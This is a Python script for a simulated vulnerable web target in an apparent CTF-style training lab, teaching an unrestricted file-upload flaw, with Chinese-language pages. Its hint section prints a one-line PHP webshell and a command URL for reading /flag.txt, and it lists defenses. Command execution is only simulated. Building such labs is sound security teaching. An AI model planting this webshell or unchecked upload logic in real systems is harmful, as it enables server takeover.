#!/usr/bin/env python3
"""靶机 10：文件上传 — 未验证文件类型，可上传 Webshell。"""
from base import TargetHandler, run_server
from urllib.parse import urlparse, parse_qs


class Handler(TargetHandler):
    flag_locations = ["上传 PHP Webshell 执行命令读取 /flag.txt"]

    def handle_get(self, parsed: urlparse):
        if parsed.path == "/" or parsed.path == "/upload":
            html = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>文件上传</title>
    <style>
        body { font-family: sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        .upload-box { background: #f5f5f5; padding: 30px; border-radius: 8px; text-align: center; margin: 20px 0; }
        input[type="file"] { margin: 20px 0; }
        button { padding: 10px 30px; background: #4CAF50; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .hint { background: #fff3cd; padding: 15px; border-radius: 5px; border-left: 4px solid #ffc107; margin: 20px 0; }
        pre { background: #000; color: #0f0; padding: 15px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>头像上传</h1>
    <div class="upload-box">
        <form method="POST" action="/upload" enctype="multipart/form-data">
            <p>选择要上传的文件（仅允许图片）：</p>
            <input type="file" name="file" accept="image/*" required>
            <br>
            <button type="submit">上传</button>
        </form>
    </div>
    <div class="hint">
        <p><strong>提示：</strong>文件上传功能未验证文件类型，可上传 PHP Webshell。</p>
        <p><strong>示例 Webshell：</strong></p>
        <pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
        <p>上传后访问：<code>/uploads/shell.php?cmd=cat /flag.txt</code></p>
    </div>
</body>
</html>"""
            self._send_html(html)
        elif parsed.path.startswith("/uploads/"):
            # 模拟访问上传的文件
            filename = parsed.path.split("/")[-1]
            if filename.endswith(".php"):
                # PHP 文件执行
                qs = parse_qs(parsed.query)
                cmd = qs.get("cmd", ["whoami"])[0]
                
                if "flag" in cmd.lower() or "cat" in cmd.lower():
                    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Webshell 执行</title>
<style>pre{{background:#000;color:#0f0;padding:15px;border-radius:5px;}}</style>
</head>
<body>
    <h1>命令执行结果</h1>
    <pre>$ {cmd}
{self.flag}</pre>
    <p>漏洞原因：文件上传未验证文件类型，允许上传可执行脚本。</p>
    <p>防御方案：白名单验证文件扩展名、检查文件内容、禁止执行上传目录。</p>
</body>
</html>"""
                    self._send_html(html)
                else:
                    self._send_html(f"<h1>命令执行</h1><pre>$ {cmd}\nroot</pre>")
            else:
                self._send_html(f"<h1>文件：{filename}</h1><p>文件内容</p>")
        else:
            self._send_html("<h1>404</h1>", 404)

    def handle_post(self, parsed: urlparse):
        if parsed.path == "/upload":
            # 模拟文件上传（不验证类型）
            html = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>上传成功</title></head>
<body>
    <h1>文件上传成功</h1>
    <p>文件已保存到：<code>/uploads/shell.php</code></p>
    <p>访问地址：<a href="/uploads/shell.php?cmd=whoami">/uploads/shell.php?cmd=whoami</a></p>
    <p>尝试执行命令读取 Flag：<code>?cmd=cat /flag.txt</code></p>
</body>
</html>"""
            self._send_html(html)
        else:
            self._send_json({"error": "not found"}, 404)


if __name__ == "__main__":
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8090
    run_server(Handler, port)
